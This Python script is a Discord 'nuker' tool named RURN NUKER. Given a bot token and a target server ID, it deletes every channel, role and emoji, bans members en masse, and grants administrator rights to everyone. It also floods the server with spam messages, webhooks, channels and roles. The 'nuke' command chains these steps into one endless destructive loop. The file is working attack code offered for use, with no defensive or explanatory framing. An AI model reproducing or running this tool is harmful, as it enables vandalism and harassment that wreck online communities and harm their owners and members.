print("\n Loading...")

import os
import sys
if os.name != "nt":
  print("\n Sorry, this tool only works in windows.")
  input("\n PRESS ENTER TO EXIT...")
  sys.exit()
try:
  import discord
except:
  os.system("py -m pip install discord.py")
  import discord
from discord.ext import commands
try:
  import requests
except:
  os.system("py -m pip install requests")
  import requests
try:
  import aiohttp
except:
  os.system("py -m pip install aiohttp")
  import aiohttp
try:
  from colorama import Fore,init
except:
  os.system("py -m pip install colorama")
  from colorama import Fore,init
try:
  from PIL import Image
except:
  os.system("py -m pip install pillow")
  from PIL import Image
from io import BytesIO
import random
import ctypes

os.system("cls")
init(autoreset=True)
ctypes.windll.kernel32.SetConsoleTitleW("RURN NUKER | Made by @hamutan_86.")

check = None
errlog = None

print(Fore.MAGENTA + """
  ██▀███   █    ██  ██▀███   ███▄    █ 
 ▓██ ▒ ██▒ ██  ▓██▒▓██ ▒ ██▒ ██ ▀█   █ 
 ▓██ ░▄█ ▒▓██  ▒██░▓██ ░▄█ ▒▓██  ▀█ ██▒
 ▒██▀▀█▄  ▓▓█  ░██░▒██▀▀█▄  ▓██▒  ▐▌██▒
 ░██▓ ▒██▒▒▒█████▓ ░██▓ ▒██▒▒██░   ▓██░
 ░ ▒▓ ░▒▓░░▒▓▒ ▒ ▒ ░ ▒▓ ░▒▓░░ ▒░   ▒ ▒ 
   ░▒ ░ ▒░░░▒░ ░ ░   ░▒ ░ ▒░░ ░░   ░ ▒░
   ░░   ░  ░░░ ░ ░   ░░   ░    ░   ░ ░ 
    ░        ░        ░              ░ 
                                      
""")

if not os.path.isfile("./config.txt"):
  with open("./config.txt", "w") as f:
    f.write("ERRLOG=False")

with open("./config.txt", "r") as f:
  c = f.read()
  c = c.split("\n")
  if c[0] == "ERRLOG=False":
    errlog = False
  elif c[0] == "ERRLOG=True":
    errlog = True
  else:
    print(f"\n {Fore.RED}[ERROR] Config is broken, check config.txt\n")
    input(f" {Fore.GREEN}[{Fore.CYAN}INFO{Fore.GREEN}] PRESS ENTER TO CONTINUE")
    sys.exit()

if os.path.isfile("./info.txt"):
  while True:
    ask = input(f"{Fore.MAGENTA} Do you use last time token and server id? (y/n): ")
    if ask == "y":
      token = ""
      serverid = ""
      with open("./info.txt", "r") as f:
        i = f.read()
        i = i.split("\n")
        token = i[0]
        serverid = i[1]
      break
    elif ask == "n":
      token = input(f"\n {Fore.RED}ENTER YOUR BOT TOKEN {Fore.MAGENTA}> {Fore.WHITE}")
      serverid = input(f" {Fore.RED}ENTER TARGET SERVER ID {Fore.MAGENTA}> {Fore.WHITE}")
      with open("./info.txt", "w") as f:
        f.write(token + "\n" + serverid)
      break
else:
  token = input(f" {Fore.RED}ENTER YOUR BOT TOKEN {Fore.MAGENTA}> {Fore.WHITE}")
  serverid = input(f" {Fore.RED}ENTER TARGET SERVER ID {Fore.MAGENTA}> {Fore.WHITE}")
  with open("./info.txt", "w") as f:
    f.write(token + "\n" + serverid)

bot = commands.Bot(command_prefix="!", intents=discord.Intents.default())

@bot.event
async def on_ready():
  global first
  global token
  global serverid
  global errlog
  os.system("cls")
  print(f"\n {Fore.GREEN}[{Fore.CYAN}INFO{Fore.GREEN}] Connected {Fore.MAGENTA}{token}\n\n")
  first = True
  
  def check():
    global first
    if first == True:
      first = False
    else:
      os.system("cls")
  
  while True:
    check()
    print(Fore.MAGENTA + """
  ██▀███   █    ██  ██▀███   ███▄    █ 
 ▓██ ▒ ██▒ ██  ▓██▒▓██ ▒ ██▒ ██ ▀█   █ 
 ▓██ ░▄█ ▒▓██  ▒██░▓██ ░▄█ ▒▓██  ▀█ ██▒
 ▒██▀▀█▄  ▓▓█  ░██░▒██▀▀█▄  ▓██▒  ▐▌██▒
 ░██▓ ▒██▒▒▒█████▓ ░██▓ ▒██▒▒██░   ▓██░
 ░ ▒▓ ░▒▓░░▒▓▒ ▒ ▒ ░ ▒▓ ░▒▓░░ ▒░   ▒ ▒ 
   ░▒ ░ ▒░░░▒░ ░ ░   ░▒ ░ ▒░░ ░░   ░ ▒░
   ░░   ░  ░░░ ░ ░   ░░   ░    ░   ░ ░ 
    ░        ░        ░              ░ 
                                      
""")

    print(f" {Fore.GREEN}[{Fore.CYAN}INFO{Fore.GREEN}] You Need to Contact The Developer? DM to {Fore.MAGENTA}@hamutan_86.")
    print(f" {Fore.GREEN}[{Fore.CYAN}INFO{Fore.GREEN}] 'help' to Show Command List\n\n")
    command = input(f" {Fore.RED}ENTER COMMAND {Fore.MAGENTA}> {Fore.WHITE}")
  
    if command == "help":
      print(f"\n {Fore.GREEN}help - Show Command List\n config - Launch Config\n info - Get Server Info\n nuke - Nuke Server Quickly\n message <CONTENT> - Message Spam\n massban [IGNORE USERS(EXAMPLE: USERID1 USERID2 USERID3)] - Ban All Users\n channel <CHANNEL NAME> <text/voice> [AMOUNT] - Create Mass Channel\n delchannels - Delete All Channels\n admin <everyone/USERID/ROLEID> - Grant Administrator Permission to everyone or user or role\n name <SERVER NAME> - Change Server Name\n icon <IMAGE URL/PATH> - Change Server Icon\n createwebhook <WEBHOOK NAME> [AMOUNT] [CHANNEL IDS(EXAMPLE: CHANNELID1 CHANNELID2 CHANNELID3)] - Create Mass Webhook\n sendwebhook <WEBHOOKS(EXAMPLE: WEBHOOK1 WEBHOOK2 WEBHOOK3)> <CONTENT> - Webhook Message Spam\n role <ROLE NAME> [AMOUNT] - Create Mass Role\n delroles - Delete All Roles\n delemojis - Delete All Emojis\n massunban - Unban All Banned Users\n emoji <EMOJI NAME> [AMOUNT] [IMAGE URL/PATH] - Create Mass Emoji\n exit - Close RURN NUKER\n\n {Fore.MAGENTA}<{Fore.RED}REQUIRED{Fore.MAGENTA}> [{Fore.RED}OPTION{Fore.MAGENTA}]\n\n")
      input(f" {Fore.GREEN}[{Fore.CYAN}INFO{Fore.GREEN}] PRESS ENTER TO CONTINUE")
    
    elif command == "config":
      while True:
        os.system("cls")
        print(Fore.MAGENTA + """
   ____ ___ _    _ _____ ___ ____ 
  / ___/ _ \| \ | | ____|_ _/ ___| 
 | |  | | | |  \| | |_   | | |  _ 
 | |__| |_| | |\  |  _|  | | |_| | 
  \____\___/|_| \_|_|   |___\____| 



""")
        print(Fore.MAGENTA + " ┏━━━┳━━━━━━━━━━━━━━━━┳━━━━━━━┓")
        print(f" {Fore.MAGENTA}┃ {Fore.CYAN}1{Fore.MAGENTA} ┃ Show Error Log ┃ {Fore.RED}{errlog} {Fore.MAGENTA}┃".replace("True", "True "))
        print(Fore.MAGENTA + " ┗━━━┻━━━━━━━━━━━━━━━━┻━━━━━━━┛\n\n")
        print(f" {Fore.GREEN}[{Fore.CYAN}INFO{Fore.GREEN}] 'exit' to Exit Config\n\n")
        command = input(f" {Fore.RED}ENTER NUMBER AND VALUE {Fore.MAGENTA}> {Fore.WHITE}")
        if command.split(" ")[0] == "1":
          if command.split(" ")[1] == "False":
            errlog = False
            with open("./config.txt", "w") as f:
              f.write("ERRLOG=False")
          elif command.split(" ")[1] == "True":
            errlog = True
            with open("./config.txt", "w") as f:
              f.write("ERRLOG=True")
          else:
            print(f"\n {Fore.RED}[ERROR] Value isn't True/False\n")
            input(f" {Fore.GREEN}[{Fore.CYAN}INFO{Fore.GREEN}] PRESS ENTER TO CONTINUE")
            continue
          print(f"\n {Fore.GREEN}[SUCCESS{Fore.GREEN}] Changed setting 1 to {Fore.MAGENTA}{errlog}")
          input(f"\n {Fore.GREEN}[{Fore.CYAN}INFO{Fore.GREEN}] PRESS ENTER TO CONTINUE")
        if command == "exit":
          break

    elif command == "nuke":
      channelname = input(f"\n {Fore.RED}ENTER CHANNEL NAME {Fore.MAGENTA}> {Fore.WHITE}")
      rolename = input(f" {Fore.RED}ENTER ROLE NAME {Fore.MAGENTA}> {Fore.WHITE}")
      message = input(f" {Fore.RED}ENTER SPAM MESSAGE CONTENT {Fore.MAGENTA}> {Fore.WHITE}")
      try:
        guild = await bot.fetch_guild(serverid)
      except Exception as e:
        print(f"\n {Fore.RED}[ERROR] Wrong server id\n")
        input(f" {Fore.GREEN}[{Fore.CYAN}INFO{Fore.GREEN}] PRESS ENTER TO CONTINUE")
        continue
      channels = requests.get(f"https://canary.discord.com/api/v10/guilds/{serverid}/channels", headers={"Authorization": f"Bot {token}"}).json()
      blacklist = []
      print(" ")
      for channel in channels:
        id = channel["id"]
        channel = await bot.fetch_channel(id)
        try:
          await channel.delete()
          print(f" {Fore.GREEN}[SUCCESS{Fore.GREEN}] Deleted channel {Fore.MAGENTA}{id}")
        except Exception as e:
          print(f" {Fore.RED}[{Fore.CYAN}!{Fore.RED}] Couldn't delete channel {Fore.MAGENTA}{id}")
          if errlog == True:
            print(f"{Fore.RED} {e}")
      roles = await guild.fetch_roles()
      for role in roles:
        id = role.id
        try:
          await role.delete()
          print(f" {Fore.GREEN}[SUCCESS{Fore.GREEN}] Deleted role {Fore.MAGENTA}{id}")
        except Exception as e:
          print(f" {Fore.RED}[{Fore.CYAN}!{Fore.RED}] Couldn't delete role {Fore.MAGENTA}{id}")
          if errlog == True:
            print(f"{Fore.RED} {e}")
      try:
        perms = guild.default_role.permissions
        perms.update(administrator=True)
        await guild.default_role.edit(permissions=perms)
        print(f" {Fore.GREEN}[SUCCESS{Fore.GREEN}] Granted administrator to {Fore.MAGENTA}everyone")
      except Exception as e:
        print(f" {Fore.RED}[{Fore.CYAN}!{Fore.RED}] Couldn't grant administrator to {Fore.MAGENTA}everyone")
        if errlog == True:
          print(f"{Fore.RED} {e}")
      while True:
        try:
          channel = await guild.create_text_channel(channelname)
          print(f" {Fore.GREEN}[SUCCESS{Fore.GREEN}] Created channel {Fore.MAGENTA}{channel.id}")
        except Exception as e:
          print(f" {Fore.RED}[{Fore.CYAN}!{Fore.RED}] Couldn't create channel")
          if errlog == True:
            print(f"{Fore.RED} {e}")
        try:
          role = await guild.create_role(name=rolename)
          print(f" {Fore.GREEN}[SUCCESS{Fore.GREEN}] Created role {Fore.MAGENTA}{role.id}")
        except Exception as e:
          print(f" {Fore.RED}[{Fore.CYAN}!{Fore.RED}] Couldn't create role")
          if errlog == True:
            print(f"{Fore.RED} {e}")   
        channels = requests.get(f"https://canary.discord.com/api/v10/guilds/{serverid}/channels", headers={"Authorization": f"Bot {token}"}).json()
        try:
          channel = random.choice(channels)
          type = channel["type"]
          id = channel["id"]
          channel = await bot.fetch_channel(id)
          if type != 4 and type != 15:
            mes = await channel.send(message)
            errcount = 0
            print(f" {Fore.GREEN}[SUCCESS{Fore.GREEN}] Sent message {Fore.MAGENTA}{mes.id} {Fore.GREEN}to {Fore.MAGENTA}{id}")
        except Exception as e:
          print(f" {Fore.RED}[{Fore.CYAN}!{Fore.RED}] Couldn't send message to {Fore.MAGENTA}{id}")
          if errlog == True:
            print(f"{Fore.RED} {e}")
        if "all" in blacklist:
          continue
        members = requests.get(f"https://canary.discord.com/api/v10/guilds/{serverid}/members?limit=1000", headers={"Authorization": f"Bot {token}"}).json()
        if members == {'message': 'Missing Access', 'code': 50001}:
          print(f" {Fore.RED}[ERROR] Your bot doesn't have server members intent")
          blacklist.append("all")
          continue
        member = random.choice(members)
        if member["user"]["id"] in blacklist:
          continue
        id = member["user"]["id"]
        member = await bot.fetch_user(id)
        try:
          await guild.ban(member)
          print(f" {Fore.GREEN}[SUCCESS{Fore.GREEN}] Banned user {Fore.MAGENTA}{id}")
        except Exception as e:
          print(f" {Fore.RED}[{Fore.CYAN}!{Fore.RED}] Couldn't ban user {Fore.MAGENTA}{id}")
          if "Missing Permission" in str(e):
            blacklist.append(id)
          if errlog == True:
            print(f"{Fore.RED} {e}")
      
  
    elif command.split(" ")[0] == "channel":
      try:
        guild = await bot.fetch_guild(serverid)
      except Exception as e:
        print(f"\n {Fore.RED}[ERROR] Wrong server id\n")
        input(f" {Fore.GREEN}[{Fore.CYAN}INFO{Fore.GREEN}] PRESS ENTER TO CONTINUE")
        continue
      amount = 1000
      count = 0
      print(" ")
      try:
        amount = int(command.split(" ")[3])
      except:
        pass
      while amount > count:
        try:
          if command.split(" ")[2] == "text":
            channel = await guild.create_text_channel(command.split(" ")[1])
          elif command.split(" ")[2] == "voice":
            channel = await guild.create_voice_channel(command.split(" ")[1])
          else:
            print(f"\n {Fore.RED}[ERROR] Please select text or voice\n")
            input(f" {Fore.GREEN}[{Fore.CYAN}INFO{Fore.GREEN}] PRESS ENTER TO CONTINUE")
            break
          print(f" {Fore.GREEN}[SUCCESS{Fore.GREEN}] Created channel {Fore.MAGENTA}{channel.id}")
        except Exception as e:
          print(f" {Fore.RED}[{Fore.CYAN}!{Fore.RED}] Couldn't create channel")
          if errlog == True:
            print(f"{Fore.RED} {e}")
        count = count + 1
      input(f"\n {Fore.GREEN}[{Fore.CYAN}COMPLETED{Fore.GREEN}] PRESS ENTER TO CONTINUE")

    elif command == "delchannels":
      res = requests.get(f"https://canary.discord.com/api/v10/guilds/{serverid}/channels", headers={"Authorization": f"Bot {token}"}).json()
      if len(res) == 0:
        print(f"\n {Fore.RED}[ERROR] Target server doesn't have any channel/category\n")
        input(f" {Fore.GREEN}[{Fore.CYAN}INFO{Fore.GREEN}] PRESS ENTER TO CONTINUE")
        continue
      print("　")
      for channel in res:
        id = channel["id"]
        channel = await bot.fetch_channel(id)
        try:
          await channel.delete()
          print(f" {Fore.GREEN}[SUCCESS{Fore.GREEN}] Deleted channel {Fore.MAGENTA}{id}")
        except Exception as e:
          print(f" {Fore.RED}[{Fore.CYAN}!{Fore.RED}] Couldn't delete channel {Fore.MAGENTA}{id}")
          if errlog == True:
            print(f"{Fore.RED} {e}")
      input(f"\n {Fore.GREEN}[{Fore.CYAN}COMPLETED{Fore.GREEN}] PRESS ENTER TO CONTINUE")     

    elif command.split(" ")[0] == "message":
      res = requests.get(f"https://canary.discord.com/api/v10/guilds/{serverid}/channels", headers={"Authorization": f"Bot {token}"}).json()
      if len(res) == 0:
        print(f"\n {Fore.RED}[ERROR] Target server doesn't have any channel/category\n")
        input(f" {Fore.GREEN}[{Fore.CYAN}INFO{Fore.GREEN}] PRESS ENTER TO CONTINUE")
        continue
      print("　")
      while True:
        for channel in res:
          id = channel["id"]
          type = channel["type"]
          channel = await bot.fetch_channel(id)
          try:
            if type != 4 and type != 15:
              mes = await channel.send(command[8:])
              errcount = 0
              print(f" {Fore.GREEN}[SUCCESS{Fore.GREEN}] Sent message {Fore.MAGENTA}{mes.id} {Fore.GREEN}to {Fore.MAGENTA}{id}")
          except Exception as e:
            print(f" {Fore.RED}[{Fore.CYAN}!{Fore.RED}] Couldn't send message to {Fore.MAGENTA}{id}")
            if errlog == True:
              print(f"{Fore.RED} {e}")

    elif command.split(" ")[0] == "massban":
      res = requests.get(f"https://canary.discord.com/api/v10/guilds/{serverid}/members?limit=1000", headers={"Authorization": f"Bot {token}"}).json()
      if res == {'message': 'Missing Access', 'code': 50001}:
        print(f"\n {Fore.RED}[ERROR] Your bot doesn't have server members intent\n")
        input(f" {Fore.GREEN}[{Fore.CYAN}INFO{Fore.GREEN}] PRESS ENTER TO CONTINUE")
        continue
      print(" ")
      guild = await bot.fetch_guild(serverid)
      for member in res:
        id = member["user"]["id"]
        member = await bot.fetch_user(id)
        try:
          if id in command.split(" "):
            continue
          await guild.ban(member)
          errcount = 0
          print(f" {Fore.GREEN}[SUCCESS{Fore.GREEN}] Banned user {Fore.MAGENTA}{id}")
        except Exception as e:
          print(f" {Fore.RED}[{Fore.CYAN}!{Fore.RED}] Couldn't ban user {Fore.MAGENTA}{id}")
          if errlog == True:
            print(f"{Fore.RED} {e}")
      input(f"\n {Fore.GREEN}[{Fore.CYAN}COMPLETED{Fore.GREEN}] PRESS ENTER TO CONTINUE")

    elif command.split(" ")[0] == "role":
      try:
        guild = await bot.fetch_guild(serverid)
      except Exception as e:
        print(f"\n {Fore.RED}[ERROR] Wrong server id\n")
        input(f" {Fore.GREEN}[{Fore.CYAN}INFO{Fore.GREEN}] PRESS ENTER TO CONTINUE")
        continue
      amount = 1000
      count = 0
      print(" ")
      try:
        amount = int(command.split(" ")[2])
      except:
        pass
      while amount > count:
        try:
          role = await guild.create_role(name=command.split(" ")[1])
          print(f" {Fore.GREEN}[SUCCESS{Fore.GREEN}] Created role {Fore.MAGENTA}{role.id}")
        except Exception as e:
          print(f" {Fore.RED}[{Fore.CYAN}!{Fore.RED}] Couldn't create role")
          if errlog == True:
            print(f"{Fore.RED} {e}")      
        count = count + 1
      input(f"\n {Fore.GREEN}[{Fore.CYAN}COMPLETED{Fore.GREEN}] PRESS ENTER TO CONTINUE")

    elif command == "delroles":
      try:
        guild = await bot.fetch_guild(serverid)
      except Exception as e:
        print(f"\n {Fore.RED}[ERROR] Wrong server id\n")
        input(f" {Fore.GREEN}[{Fore.CYAN}INFO{Fore.GREEN}] PRESS ENTER TO CONTINUE")
        continue
      roles = await guild.fetch_roles()
      print(" ")
      for role in roles:
        id = role.id
        try:
          await role.delete()
          print(f" {Fore.GREEN}[SUCCESS{Fore.GREEN}] Deleted role {Fore.MAGENTA}{id}")
        except Exception as e:
          print(f" {Fore.RED}[{Fore.CYAN}!{Fore.RED}] Couldn't delete role {Fore.MAGENTA}{id}")
          if errlog == True:
            print(f"{Fore.RED} {e}")
      input(f"\n {Fore.GREEN}[{Fore.CYAN}COMPLETED{Fore.GREEN}] PRESS ENTER TO CONTINUE")

    elif command.split(" ")[0] == "createwebhook":
      res = None
      amount = 1000
      count = 0
      try:
        if command.split(" ")[3] != None:
          res = []
          for channel in command.split(" ")[3:]:
            res.append({})
            res[count]["id"] = int(channel)
          amount = int(command.split(" ")[2])
          count = 0
      except:
        try:
          if len(command.split(" ")[2]) > 10:
            res = []
            for channel in command.split(" ")[2:]:
              res.append({})
              res[count]["id"] == int(channel)
            count = 0
          else:
            amount = int(command.split(" ")[2])
            res = requests.get(f"https://canary.discord.com/api/v10/guilds/{serverid}/channels", headers={"Authorization": f"Bot {token}"}).json()
            if len(res) == 0:
              print(f"\n {Fore.RED}[ERROR] Target server doesn't have any channel/category\n")
              input(f" {Fore.GREEN}[{Fore.CYAN}INFO{Fore.GREEN}] PRESS ENTER TO CONTINUE")
              continue
        except:
          res = requests.get(f"https://canary.discord.com/api/v10/guilds/{serverid}/channels", headers={"Authorization": f"Bot {token}"}).json()
          if len(res) == 0:
            print(f"\n {Fore.RED}[ERROR] Target server doesn't have any channel/category\n")
            input(f" {Fore.GREEN}[{Fore.CYAN}INFO{Fore.GREEN}] PRESS ENTER TO CONTINUE")
            continue
      print(f"\n {Fore.GREEN}[{Fore.CYAN}INFO{Fore.GREEN}] Created webhooks stored in {Fore.MAGENTA}webhooks.txt\n")
      while amount > count:
        for channel in res:
          id = channel["id"]
          channel = await bot.fetch_channel(id)
          async with aiohttp.ClientSession() as request:
            async with request.post(f"https://canary.discord.com/api/v10/channels/{id}/webhooks", json={"name": command.split(" ")[1]}, headers={"Authorization": f"Bot {token}"}) as resp:
              if resp.status in range(200, 299):
                webhook = await resp.json()
                print(f" {Fore.GREEN}[SUCCESS{Fore.GREEN}] Created webhook {Fore.MAGENTA}{webhook['url']} {Fore.GREEN}to {Fore.MAGENTA}{id}")
                with open("./webhooks.txt", "a") as f:
                  f.write(f"{webhook['url']} ")
              else:
                print(f" {Fore.RED}[{Fore.CYAN}!{Fore.RED}] Couldn't create webhook to {Fore.MAGENTA}{id}")
                if errlog == True:
                  e = await resp.json()
                  print(f"{Fore.RED} {e}")
              count = count + 1
      input(f"\n {Fore.GREEN}[{Fore.CYAN}COMPLETED{Fore.GREEN}] PRESS ENTER TO CONTINUE")

    elif command.split(" ")[0] == "sendwebhook":
      content = ""
      content_base = []
      webhooks = []
      for arg in command.split(" ")[1:]:
        if arg.startswith("https://discord.com/api/webhooks/"):
          webhooks.append(arg)
        else:
          count = command.split(" ").index(arg)
          content_base = command.split(" ")[count:]
          for base in content_base:
            content = content + base + " "
          break
      print(" ")
      while True:
        for webhook in webhooks:
          res = requests.post(webhook, json={"content": content})
          if res.status_code in range(200, 299):
            print(f" {Fore.GREEN}[SUCCESS{Fore.GREEN}] Sent message to {Fore.MAGENTA}{webhook}")
          else:
            print(f" {Fore.RED}[{Fore.CYAN}!{Fore.RED}] Couldn't sent message to {Fore.MAGENTA}{webhook}")
            if errlog == True:
              resp = res.json()
              print(f"{Fore.RED} {resp}")

    elif command == "massunban":
      try:
        guild = await bot.fetch_guild(serverid)
      except Exception as e:
        print(f"\n {Fore.RED}[ERROR] Wrong server id\n")
        input(f" {Fore.GREEN}[{Fore.CYAN}INFO{Fore.GREEN}] PRESS ENTER TO CONTINUE")
        continue
      print(" ")
      async for user in guild.bans(limit=1000):
        try:
          await guild.unban(user.user)
          print(f" {Fore.GREEN}[SUCCESS{Fore.GREEN}] Unbanned user {Fore.MAGENTA}{user.user.id}")
        except Exception as e:
         print(f" {Fore.RED}[{Fore.CYAN}!{Fore.RED}] Couldn't unban {Fore.MAGENTA}{user.user.id}")
         if errlog == True:
           print(f"{Fore.RED} {e}")
      input(f"\n {Fore.GREEN}[{Fore.CYAN}COMPLETED{Fore.GREEN}] PRESS ENTER TO CONTINUE")
          
    elif command.split(" ")[0] == "emoji":
      try:
        guild = await bot.fetch_guild(serverid)
      except Exception as e:
        print(f"\n {Fore.RED}[ERROR] Wrong server id\n")
        input(f" {Fore.GREEN}[{Fore.CYAN}INFO{Fore.GREEN}] PRESS ENTER TO CONTINUE")
        continue
      img = "./emoji.png"
      amount = 1000
      count = 0
      try:
        amount = int(command.split(" ")[2])
        img = command.split(" ")[3]
      except:
        try:
          amount = int(command.split(" ")[3])
          img = command.split(" ")[3]
        except:
          try:
            amount = int(command.split(" ")[2])
          except:
            try:
              img = command.split(" ")[2]
            except:
              pass
      if img.startswith("http://") or img.startswith("https://"):
        image = Image.open(requests.get(img, stream=True).raw, mode="r")
        b = BytesIO()
        image.save(b, format="PNG")
        bytes = b.getvalue()
      else:
        image = Image.open(img, mode="r")
        b = BytesIO()
        image.save(b, format="PNG")
        bytes = b.getvalue()
      print(" ")
      while amount > count:
        try:
          emoji = await guild.create_custom_emoji(name=command.split(" ")[1], image=bytes)
          print(f" {Fore.GREEN}[SUCCESS{Fore.GREEN}] Created emoji {Fore.MAGENTA}{emoji.id}")
        except Exception as e:
          print(f" {Fore.RED}[{Fore.CYAN}!{Fore.RED}] Couldn't create emoji")
          if errlog == True:
             print(f"{Fore.RED} {e}")
        count = count + 1
      input(f"\n {Fore.GREEN}[{Fore.CYAN}COMPLETED{Fore.GREEN}] PRESS ENTER TO CONTINUE")

    elif command == "delemojis":
      try:
        guild = await bot.fetch_guild(serverid)
      except Exception as e:
        print(f"\n {Fore.RED}[ERROR] Wrong server id\n")
        input(f" {Fore.GREEN}[{Fore.CYAN}INFO{Fore.GREEN}] PRESS ENTER TO CONTINUE")
        continue
      emojis = await guild.fetch_emojis()
      print(" ")
      for emoji in emojis:
        try:
          await emoji.delete()
          print(f" {Fore.GREEN}[SUCCESS{Fore.GREEN}] Deleted emoji {Fore.MAGENTA}{emoji.id}")
        except Exception as e:
          print(f" {Fore.RED}[{Fore.CYAN}!{Fore.RED}] Couldn't delete emoji {Fore.MAGENTA}{emoji.id}")
          if errlog == True:
             print(f"{Fore.RED} {e}")
      input(f"\n {Fore.GREEN}[{Fore.CYAN}COMPLETED{Fore.GREEN}] PRESS ENTER TO CONTINUE")

    elif command.split(" ")[0] == "name":
      try:
        guild = await bot.fetch_guild(serverid)
      except Exception as e:
        print(f"\n {Fore.RED}[ERROR] Wrong server id\n")
        input(f" {Fore.GREEN}[{Fore.CYAN}INFO{Fore.GREEN}] PRESS ENTER TO CONTINUE")
        continue
      print(" ")
      try:
        await guild.edit(name=command[5:])
        print(f" {Fore.GREEN}[SUCCESS{Fore.GREEN}] Changed server name")
      except Exception as e:
        print(f" {Fore.RED}[{Fore.CYAN}!{Fore.RED}] Couldn't change server name")
        if errlog == True:
           print(f"{Fore.RED} {e}")
      input(f"\n {Fore.GREEN}[{Fore.CYAN}COMPLETED{Fore.GREEN}] PRESS ENTER TO CONTINUE")

    elif command.split(" ")[0] == "icon":
      try:
        guild = await bot.fetch_guild(serverid)
      except Exception as e:
        print(f"\n {Fore.RED}[ERROR] Wrong server id\n")
        input(f" {Fore.GREEN}[{Fore.CYAN}INFO{Fore.GREEN}] PRESS ENTER TO CONTINUE")
        continue
      img = command.split(" ")[1]
      if img.startswith("http://") or img.startswith("https://"):
        image = Image.open(requests.get(img, stream=True).raw, mode="r")
        b = BytesIO()
        image.save(b, format="PNG")
        bytes = b.getvalue()
      else:
        image = Image.open(img, mode="r")
        b = BytesIO()
        image.save(b, format="PNG")
        bytes = b.getvalue()
      print(" ")
      try:
        await guild.edit(icon=bytes)
        print(f" {Fore.GREEN}[SUCCESS{Fore.GREEN}] Changed server icon")
      except Exception as e:
        print(f" {Fore.RED}[{Fore.CYAN}!{Fore.RED}] Couldn't change server icon")
        if errlog == True:
           print(f"{Fore.RED} {e}")
      input(f"\n {Fore.GREEN}[{Fore.CYAN}COMPLETED{Fore.GREEN}] PRESS ENTER TO CONTINUE")

    elif command == "info":
      try:
        guild = await bot.fetch_guild(serverid)
      except Exception as e:
        print(f"\n {Fore.RED}[ERROR] Wrong server id\n")
        input(f" {Fore.GREEN}[{Fore.CYAN}INFO{Fore.GREEN}] PRESS ENTER TO CONTINUE")
        continue
      channels = requests.get(f"https://canary.discord.com/api/v10/guilds/{serverid}/channels", headers={"Authorization": f"Bot {token}"}).json()
      roles = requests.get(f"https://canary.discord.com/api/v10/guilds/{serverid}/roles", headers={"Authorization": f"Bot {token}"}).json()
      members = requests.get(f"https://canary.discord.com/api/v10/guilds/{serverid}/members?limit=1000", headers={"Authorization": f"Bot {token}"}).json()
      if members == {'message': 'Missing Access', 'code': 50001}:
        members = f"{Fore.RED}Your bot doesn't have server members intent"
      else:
        members = len(members)
      print(f"\n {Fore.GREEN}[{Fore.CYAN}SERVER INFO{Fore.GREEN}]")
      print(f" {Fore.GREEN}Name: {Fore.MAGENTA}{guild.name}")
      print(f" {Fore.GREEN}ID: {Fore.MAGENTA}{guild.id}")
      print(f" {Fore.GREEN}Members: {Fore.MAGENTA}{members}")
      print(f" {Fore.GREEN}[{Fore.CYAN}CATEGORIES/CHANNELS{Fore.GREEN}]")
      for channel in channels:
        type = ""
        if channel["type"] == 0:
          type = "Text"
        elif channel["type"] == 2:
          type = "Voice"
        elif channel["type"] == 4:
          type = "Category"
        elif channel["type"] == 5:
          type = "Announcement"
        elif channel["type"] == 13:
          type = "Stage"
        elif channel["type"] == 15:
          type = "Forum"
        else:
          type = "Unknown"
        print(f" {Fore.MAGENTA}{type} | {channel['name']} | {channel['id']}")
      print(f" {Fore.GREEN}[{Fore.CYAN}ROLES{Fore.GREEN}]")
      for role in roles:
        print(f" {Fore.MAGENTA}{role['name']} | {role['id']}")
      input(f"\n {Fore.GREEN}[{Fore.CYAN}COMPLETED{Fore.GREEN}] PRESS ENTER TO CONTINUE")

    elif command.split(" ")[0] == "admin":
      try:
        guild = await bot.fetch_guild(serverid)
      except Exception as e:
        print(f"\n {Fore.RED}[ERROR] Wrong server id\n")
        input(f" {Fore.GREEN}[{Fore.CYAN}INFO{Fore.GREEN}] PRESS ENTER TO CONTINUE")
        continue
      print(" ")
      if command.split(" ")[1] == "everyone":
        try:
          perms = guild.default_role.permissions
          perms.update(administrator=True)
          await guild.default_role.edit(permissions=perms)
          print(f" {Fore.GREEN}[SUCCESS{Fore.GREEN}] Granted administrator to {Fore.MAGENTA}everyone")
        except Exception as e:
          print(f" {Fore.RED}[{Fore.CYAN}!{Fore.RED}] Couldn't grant administrator to {Fore.MAGENTA}everyone")
          if errlog == True:
            print(f"{Fore.RED} {e}")
      else:
        res = requests.get(f"https://canary.discord.com/api/v10/users/{command.split(' ')[1]}", headers={"Authorization": f"Bot {token}"}).json()
        if "id" in res:
          try:
            role = await guild.create_role(name=".")
            perms = role.permissions
            perms.update(administrator=True)
            await role.edit(permissions=perms)
            member = await guild.fetch_member(int(command.split(" ")[1]))
            await member.add_roles(role)
            print(f" {Fore.GREEN}[SUCCESS{Fore.GREEN}] Granted administrator to {Fore.MAGENTA}{command.split(' ')[1]}")
          except Exception as e:
            print(f" {Fore.RED}[{Fore.CYAN}!{Fore.RED}] Couldn't grant administrator to {Fore.MAGENTA}{command.split(' ')[1]}")
            if errlog == True:
              print(f"{Fore.RED} {e}")
        else:
          try:
            role = None
            roles = await guild.fetch_roles()
            for rol in roles:
              if rol.id == int(command.split(" ")[1]):
                role = rol
            perms = rol.permissions
            perms.update(administrator=True)
            await role.edit(permissions=perms)
            print(f" {Fore.GREEN}[SUCCESS{Fore.GREEN}] Granted administrator to {Fore.MAGENTA}{command.split(' ')[1]}")
          except Exception as e:
            print(f" {Fore.RED}[{Fore.CYAN}!{Fore.RED}] Couldn't grant administrator to {Fore.MAGENTA}{command.split(' ')[1]}")
            if errlog == True:
              print(f"{Fore.RED} {e}")
          
      input(f"\n {Fore.GREEN}[{Fore.CYAN}COMPLETED{Fore.GREEN}] PRESS ENTER TO CONTINUE")
        

    elif command == "exit":
      sys.exit()
  
    else:
      print(f"\n {Fore.RED}[ERROR] Command Not Found\n")
      input(f" {Fore.GREEN}[{Fore.CYAN}INFO{Fore.GREEN}] PRESS ENTER TO CONTINUE")
  
try:  
  bot.run(token, log_handler=None)
except Exception as e:
  print(f"\n {Fore.RED}[ERROR] Wrong token\n")
  input(f" {Fore.GREEN}[{Fore.CYAN}INFO{Fore.GREEN}] PRESS ENTER TO CONTINUE")